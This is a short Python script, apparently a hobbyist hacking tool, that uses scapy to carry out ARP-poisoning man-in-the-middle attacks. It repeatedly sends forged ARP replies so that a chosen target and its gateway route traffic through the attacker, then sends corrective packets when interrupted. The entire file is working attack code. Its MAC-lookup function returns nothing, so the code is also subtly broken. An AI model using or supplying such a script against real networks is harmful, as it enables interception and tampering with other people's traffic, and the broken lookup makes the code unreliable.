import scapy.all as scapy
import optparse
import time

print("MITM")
def getting_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t", "--target", dest="targetip", help="Enter Target IP")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP")

    options = parse_object.parse_args()[0]

    if not options.targetip:
        print("Enter Target IP")
        
    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options


def get_mac_address(ip):
    arp_request_packet=scapy.ARP(pdst=ip)
    broadcast_packet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet=broadcast_packet/arp_request_packet
    (answered_list)=scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    answered_list.summary()

def arp_poisoning(targetip,poisoned_ip):
    target_mac = get_mac_address(targetip)
    arp_response = scapy.ARP(op=2, pdst=targetip, hwdst=target_mac, psrc=poisoned_ip)
    #hwdst = hardware destination(mac address)
    # scapy.ls(scapy.ARP())
    scapy.send(arp_response,verbose=False)

def arp_poison_reset(fooledip,gateway_ip):
    gateway_mac = get_mac_address(gateway_ip)
    fooled_mac = get_mac_address(fooledip)
    arp_response = scapy.ARP(op=2, pdst=fooledip, hwdst=fooled_mac, psrc=gateway_ip,hwsrc=gateway_mac)
    # hwdst = hardware destination(mac address)
    # scapy.ls(scapy.ARP())
    scapy.send(arp_response, verbose=False,count=6)





number = 0
try:
    while True:

        user_ips = getting_input()
        user_target_ip = user_ips.targetip
        user_gateway_ip = user_ips.gateway_ip
        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)
        number += 2
        print("sending packages")
        time.sleep(3)
except KeyboardInterrupt:
    print("quitted from  the mitm")
    arp_poison_reset(user_target_ip,user_gateway_ip)
    arp_poison_reset(user_gateway_ip,user_target_ip)
